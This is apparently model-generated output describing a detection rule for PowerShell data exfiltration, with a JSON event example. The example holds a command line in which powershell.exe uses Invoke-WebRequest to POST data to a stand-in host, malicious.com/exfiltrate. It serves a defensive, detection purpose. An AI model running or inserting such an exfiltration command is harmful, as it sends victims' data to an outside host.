<output>
1. **Identify Data Exfiltration via PowerShell**  
   - Monitor for events where the `srcNode` is a PowerShell process (e.g., `powershell.exe` or `pwsh.exe`).  
   - Set the `dstNode` to reflect the external server being contacted, specifically targeting the URI `http://malicious.com/exfiltrate`.  
   - Ensure the `relation` is set to "Process Create" for the PowerShell process.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Cmdline": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command Invoke-WebRequest -Uri http://malicious.com/exfiltrate -Method POST -Body $data",
         "Type": "Process"
       },
       "dstNode": {
         "Dstaddress": "http://malicious.com",
         "Type": "Network"
       },
       "relation": "Process Create"
     }
     ```
</output>